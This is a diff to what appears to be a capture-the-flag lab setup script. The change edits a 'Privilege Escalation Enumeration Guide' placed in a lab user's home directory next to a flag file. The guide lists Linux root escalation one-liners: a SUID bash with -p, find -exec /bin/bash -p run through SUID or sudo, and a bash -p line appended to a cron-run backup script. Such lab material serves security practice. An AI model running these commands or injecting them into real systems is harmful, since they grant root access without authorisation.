@@ -82,28 +82,20 @@ cat << 'EOF' > /home/normaluser/privesc_notes.txt
 
 Privilege Escalation Enumeration Guide
 
-SUID bash
-
+1.SUID bash
 /usr/local/bin/bash -p
 
-SUID find
+or
 
-/usr/local/bin/find . -exec /bin/bash -p \; -quit
 
- sudo find
+2.SUID find
+sudo /usr/bin/find . -exec /bin/bash -p \; -quit
 
-sudo find . -exec /bin/bash -p \; -quit
+or
 
-Writable SUID script
-
-echo "/bin/bash -p" >> /opt/myapp/cleanup_script.sh
-
-Cron job injection
+3.Cron job injection
 
 echo "/usr/local/bin/bash -p" >> /opt/backup/backup.sh
-
-
-
 EOF
 
 cat << 'EOF' > /home/normaluser/root_normaluserflag.txt
